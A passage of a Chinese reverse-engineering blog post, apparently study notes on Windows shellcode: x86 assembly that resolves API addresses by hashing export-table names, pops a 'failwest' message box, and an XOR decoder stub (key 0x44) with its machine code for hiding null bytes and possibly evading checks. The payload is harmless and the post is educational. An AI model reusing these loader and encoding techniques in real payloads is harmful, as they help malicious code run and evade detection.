+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191748156.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191748156.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917191748156"></p>
+<p>显然eax=0x0c917432!=0x1e380a6a,jne条件转移实现</p>
+<p>因此跳转find_functions</p>
+<blockquote>
+<p>如果这里eax=0x1e380a6a即意味着要寻找MessageBoxA函数地址,则jne条件不满足,顺序执行,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xchg eax, ebp 			; save current hash </span><br><span class="line">call [edi - 0x8] 		; LoadLibraryA </span><br><span class="line">xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">						; with base address of user32.dll 	</span><br></pre></td></tr></table></figure>
+<p>这里edi-0x8是LoadLibraryA的地址,显然是已经获取LoadLibraryA的地址了,这是后话了</p>
+</blockquote>
+<h4 id="遍历两个表寻找目标函数"><a href="#遍历两个表寻找目标函数" class="headerlink" title="遍历两个表寻找目标函数"></a>遍历两个表寻找目标函数</h4><h5 id="开端"><a href="#开端" class="headerlink" title="开端"></a>开端</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find_functions: </span><br><span class="line">	pushad 						; preserve registers </span><br><span class="line">	mov eax, [ebp + 0x3c]		; eax = start of PE header </span><br><span class="line">	mov ecx, [ebp + eax + 0x78]	; ecx = relative offset of export table </span><br><span class="line">	add ecx, ebp 				; ecx = absolute addr of export table </span><br><span class="line">	mov ebx, [ecx + 0x20] 		; ebx = relative offset of names table </span><br><span class="line">	add ebx, ebp 				; ebx = absolute addr of names table </span><br><span class="line">	xor edi, edi 				; edi will count through the functions </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>所有通用寄存器压栈保存,然后各司其职设置参数</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917195103779.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917195103779.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917195103779"></p>
+<p>在此之前ebp是指向kernel32.dll的基地址的,其他各个数值依据ebp加上偏移量得到</p>
+<h5 id="库函数表指针后移一个单位"><a href="#库函数表指针后移一个单位" class="headerlink" title="库函数表指针后移一个单位"></a>库函数表指针后移一个单位</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">next_function_loop: </span><br><span class="line">	inc edi 					; increment function counter </span><br><span class="line">	mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name </span><br><span class="line">	add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">	cdq 						; dl will hold hash (we know eax is small) </span><br></pre></td></tr></table></figure>
+<p>edi作为下标,ebx是函数名表的基地址,</p>
+<p>[ebx+edi*4]是一个基址变址寻址,相当于访问数组,数组的每个元素都是4字节的</p>
+<p>显然函数名表的每个表项都是4字节的字符串指针,</p>
+<p>mov esi, [ebx + edi * 4]相当于把一个库函数名指针相对Kernel32.dll的偏移量放到esi上了</p>
+<p>然后加上ebp(kernel32.dll映像基址),就得到了库函数名指针的绝对地址</p>
+<p>cdq的作用是eax有符号拓展到edx:eax</p>
+<h5 id="计算一个库函数名的摘要"><a href="#计算一个库函数名的摘要" class="headerlink" title="计算一个库函数名的摘要"></a>计算一个库函数名的摘要</h5><p>这就是GetHash函数的汇编版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	movsx eax, byte ptr[esi]</span><br><span class="line">	cmp al,ah</span><br><span class="line">	jz compare_hash</span><br><span class="line">	ror edx,7</span><br><span class="line">	add edx,eax</span><br><span class="line">	inc esi</span><br><span class="line">	jmp hash_loop</span><br></pre></td></tr></table></figure>
+<p>esi是库函数名指针,取出一个字节解引用后带符号拓展到eax上</p>
+<p>如果al和ah相等,说明eax=0,即已经扫描到这个字符串的’\0’,应该结束了,跳转compare_hash进行比较</p>
+<p>否则该字符串还没有结束,继续取值直到al=ah</p>
+<h5 id="比较摘要值"><a href="#比较摘要值" class="headerlink" title="比较摘要值"></a>比较摘要值</h5><p>到达这一步的时候,是hash_loops计算完库函数名的摘要值了,结果放到了edx上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compare_hash:	</span><br><span class="line">	cmp edx, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) </span><br><span class="line">	jnz next_function_loop </span><br></pre></td></tr></table></figure>
+<p>esp+0x1C指向谁呢?保存的我们希望寻找的摘要值</p>
+<p>[esp+0x1C]解引用,将希望寻找的摘要值和edx进行比较,如果为0说明找到了,不用跳转,否则没找到就得重复next_function_loop计算下一个库函数的摘要和希望的摘要进行比较</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917195103779.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917195103779.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt=""></p>
+<h5 id="如果匹配"><a href="#如果匹配" class="headerlink" title="如果匹配"></a>如果匹配</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of ordinals table </span><br><span class="line">mov di, [ebx + 2 * edi] 	; di = ordinal number of matched function </span><br><span class="line">mov ebx, [ecx + 0x1c] 		; ebx = relative offset of address table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of address table </span><br><span class="line">add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the </span><br><span class="line">							; relative offset of matched function </span><br><span class="line">xchg eax, ebp 				; move func addr into eax </span><br><span class="line">pop edi 					; edi is last onto stack in pushad </span><br><span class="line">stosd 						; write function addr to [edi] and increment edi </span><br><span class="line">push edi </span><br><span class="line">popad					; restore registers </span><br><span class="line">		 				; loop until we reach end of last hash </span><br><span class="line">cmp eax,0x1e380a6a</span><br><span class="line">jne find_lib_functions </span><br></pre></td></tr></table></figure>
+<p>用名字表的下标查序号表,再用序号表相应值作为下标查导出函数地址表,然后把地址放到eax,写到edi指向的地址上</p>
+<p>当eax=0x1e280a6a,即MessageBoxA的摘要时,说明所有函数的地址都查完了并且写好了</p>
+<p>否则还有函数没有解析地址,至少MessageBoxA没有,跳转find_lib_functions外圈大循环,寻找下一个希望的摘要值对应函数的地址</p>
+<h4 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h4><p>执行到这里,所有函数都已经解析完毕,下面就要调用窗口并且exit(0)返回了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function_call:</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	push ebx			// cut string</span><br><span class="line">	push 0x74736577</span><br><span class="line">	push 0x6C696166		//push failwest</span><br><span class="line">	mov eax,esp			//load address of failwest</span><br><span class="line">	push ebx	</span><br><span class="line">	push eax</span><br><span class="line">	push eax</span><br><span class="line">	push ebx</span><br><span class="line">	call [edi - 0x04] ; //call MessageboxA</span><br><span class="line">	push ebx</span><br><span class="line">	call [edi - 0x08] ; // call ExitProcess</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br></pre></td></tr></table></figure>
+<h2 id="shellcode加壳"><a href="#shellcode加壳" class="headerlink" title="shellcode加壳"></a>shellcode加壳</h2><p>shellcode加壳,其目的要么是消去其中的00字节,使得整个shellcode可以被串拷贝进入缓冲区,防止截断</p>
+<p>并且还可能绕过安全检查?</p>
+<p>书上给出的加壳函数decode,使用key=0x44对input字符串进行异或加密,input的逐个字节都和key进行异或,结果写入encode.txt</p>
+<p>解码器是这样写的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">			add eax, 0x14 //locate the real start of shellcode</span><br><span class="line">			xor ecx,ecx</span><br><span class="line">decode_loop:</span><br><span class="line">			mov bl,[eax+ecx]</span><br><span class="line">			xor bl, 0x44 //key,should be changed to decode </span><br><span class="line">			mov [eax+ecx],bl</span><br><span class="line">			</span><br><span class="line">			inc ecx</span><br><span class="line">			cmp bl,0x90 // assume 0x90 as the end mark of shellcode </span><br><span class="line">			jne decode_loop</span><br></pre></td></tr></table></figure>
+<p>一开始eax增加20个字节,正好跳过解码器</p>
+<blockquote>
+<p>解码器编译之后生成的机器码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">83 C0 14 33 C9 8A 1C 08 80 F3 44 88 1C 08 41 80</span><br><span class="line">FB 90 75 F1</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>ecx一开始置零,后来[eax+ecx]是一个基址编址寻址,eax是基址,即shellcode的基地址,ecx是偏移量,ecx会遍历shellcode区域.当解码出0x90时,意味着shellcode到头了(我们自己规定的shellcode最后以0x90结尾),此时不再重复decode_loop,控制自然顺序转移给shellcode的起始位置</p>
+<p>否则,即尚未解码出0x90,则shellcode还没有完全解密,重复decode_loop</p>
+<p>将解码器的机器码放到shellcode之前,然后将整体放到字符数组里丢到调试环境里就可以弹窗了</p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/reverse/" class="">
+              reverse
+            </a>
+          
+        </div>
+        
+      </div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+    </div>
+    <a href="/2022/09/17/010editor%20%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> Prev:
+        <div class="title-text">010editor 模板语法</div>
+      </div>
+      
+      <!-- <div class="content">
+        010editor 模板编写以linux上的归档文件AR,或者说windows上的静态库LIB为例看看模板是咋写的
+总的
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/14.jpg" class="lazyload placeholder" data-srcset="/medias/14.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+    </div>
+    <a href="/2022/09/17/windowsROP/" class="post-nav-link">
+      <div class="title">
+        Next: <i class="fas fa-angle-right"></i>
+        <div class="title-text">windows初级ROP</div>
+      </div>
+      <!-- <div class="content">
+        windows初级ROP工具VC++6.0链接：https://pan.baidu.com/s/1jfAzvMvi27z
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      
+<section id="comments" style="padding: 1em; margin: 15px auto;"
+	class="animated bounceInUp">
+	<div id="vcomment" class="comment"></div>
+</section>
+<style>
+	#comments {
+		background: rgba(255,255,255,0.9);
+	}
+	#veditor {
+		background-image: url('https://raw.githubusercontent.com/DeutschBall/test/master/R.3c3e443dfe9ddbddc93730c482ed0461');
+		background-size: contain;
+		background-repeat: no-repeat;
+		background-position: right;
+		background-color: rgba(255, 255, 255, 0);
+		resize: vertical;
+	}
+	#veditor:focus{
+		background-position-y: 200px;
+		transition: all 0.2s ease-in-out 0s;
+	}
+	#vcomment .vcards .vcard .vh .vhead .vtag.vvisitor {
+		background-color: #42b983;
+	}
+	.v[data-class=v] .vbtn:active, .v[data-class=v] .vbtn:hover {
+		color: #42b983;
+		border-color: #42b983;
+	}
+	#vcomment .vcards .vcard .vhead .vsys i {
+		display: none;
+	}
+	/* 底部valine链接 */
+	#vcomment .vpower {
+		display: none;
+	}
+	
+	/* 底下注释是修改 名称和邮箱和网址输入框的样式 */
+	/* #vcomment .vheader {
+		display: flex;
+		justify-content: space-around;
+	}
+	
+	#vcomment .vheader .vnick {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vmail {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vlink {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	} */
+
+	img.vimg {
+		transition: all 1s;
+		/* 头像旋转时间为 1s */
+	}
+
+	img.vimg:hover {
+		transform: rotate(360deg);
+		-webkit-transform: rotate(360deg);
+		-moz-transform: rotate(360deg);
+		-o-transform: rotate(360deg);
+		-ms-transform: rotate(360deg);
+	}
+
+	#vcomment .vcards .vcard {
+		padding: 15px 20px 0 20px;
+		border-radius: 10px;
+		margin-bottom: 15px;
+		box-shadow: 0 0 4px 1px rgba(0, 0, 0, .12);
+		transition: all .3s
+	}
+
+	#vcomment .vcards .vcard:hover {
+		box-shadow: 0 0 8px 3px rgba(0, 0, 0, .12)
+	}
+
+	#vcomment .vcards .vcard .vh .vcard {
+		border: none;
+		box-shadow: none;
+	}
+</style>
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>catalog</span>
+        
+          <div class="toc-open-close">catalog</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
+  
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+  <script>
+  // https://github.com/theme-next/hexo-theme-next/blob/master/layout/_third-party/math/mathjax.swig
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.0/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    // 文章章节标题不能为 “MathJax” ，否则会报错。
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2019 - 2020 <a target="_blank" rel="noopener" href="https://github.com/yuang01">Deutschball</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Deutschball</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+<script src='https://unpkg.com/mermaid@/dist/mermaid.min.js'></script>
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({theme: 'forest'});
+  }
+</script>
+
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script>
+
+<script>
+  var headerEl = 'h2, h3, h4, h5, h6',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -80,
+    headingsOffset: -($(window).height() * 0.4 - 45),
+    positionFixedSelector: '.toc-main',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 100) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('toc-aside')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  }
+</style> 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const headerMenuTransparent = true;
+    if (!headerMenuTransparent) { return; }
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
